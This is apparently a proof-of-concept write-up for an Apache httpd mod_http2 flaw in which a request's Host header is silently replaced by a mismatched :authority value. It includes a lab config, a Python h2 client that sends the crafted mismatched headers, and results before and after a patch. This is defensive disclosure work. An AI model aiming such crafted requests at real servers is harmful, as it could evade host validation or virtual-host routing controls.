# PoC 129 - HTTP/2 Host vs :authority mismatch silently overwritten

`h2_request_end_headers()` rewrites `Host` to `:authority` whenever both are
present, hiding a malformed mismatch from later request validation, vhost
selection, and module logic.

## Setup

Lab httpd 2.4.66 with `mod_http2`, two name-based virtual hosts, and a
default vhost that should not be reached for `victim.example`.

`conf/httpd.conf`:

```
ServerName default.example
Listen 127.0.0.1:8443
LoadModule mpm_event_module  modules/mod_mpm_event.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule ssl_module        modules/mod_ssl.so
LoadModule http2_module      modules/mod_http2.so
LoadModule unixd_module      modules/mod_unixd.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule mime_module       modules/mod_mime.so

Protocols h2 http/1.1
ErrorLog logs/error_log
LogLevel http2:trace4

SSLEngine on
SSLCertificateFile  conf/server.crt
SSLCertificateKeyFile conf/server.key
DocumentRoot "/tmp/htdocs"

<VirtualHost _default_:8443>
    ServerName victim.example
    DocumentRoot "/tmp/htdocs/victim"
    CustomLog logs/victim.log "%h %{Host}i %U"
</VirtualHost>

<VirtualHost _default_:8443>
    ServerName attacker.example
    DocumentRoot "/tmp/htdocs/attacker"
    CustomLog logs/attacker.log "%h %{Host}i %U"
</VirtualHost>
```

Generate `server.crt`/`server.key` with `openssl req -x509 -newkey rsa:2048
-nodes -keyout conf/server.key -out conf/server.crt -subj '/CN=*' -days 1`,
and put a distinct `index.html` in each docroot.

## Trigger

We need to send an HTTP/2 request whose `:authority` is `victim.example` but
whose `Host` header is `attacker.example`. `curl` normalises the two, so use
a small `h2` client with `nghttp2` Python bindings:

```
python3 - <<'PY'
import socket, ssl, h2.connection, h2.config
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
sock = ctx.wrap_socket(socket.create_connection(("127.0.0.1", 8443)),
                       server_hostname="victim.example")
c = h2.connection.H2Connection(h2.config.H2Configuration(client_side=True))
c.initiate_connection()
sock.sendall(c.data_to_send())
c.send_headers(1, [
    (":method", "GET"), (":path", "/"), (":scheme", "https"),
    (":authority", "victim.example"),
    ("host", "attacker.example"),
], end_stream=True)
sock.sendall(c.data_to_send())
print(sock.recv(4096).decode("latin1"))
PY
```

## Observed effect

- The 2.4.66 build accepts the request. `victim.log` records the access with
  `Host: victim.example` because `h2_request_end_headers()` rewrote `Host`
  before logging.
- `attacker.log` records nothing: the original `Host: attacker.example`
  value never reached vhost selection.
- No `AH02415`/`AH02416` malformed-request warning is logged. The mismatch
  is silently normalised.

With the patch, the same client receives an `RST_STREAM` and `error_log`
shows `APR_BADARG` from `h2_request_end_headers()`. Neither vhost serves the
request.
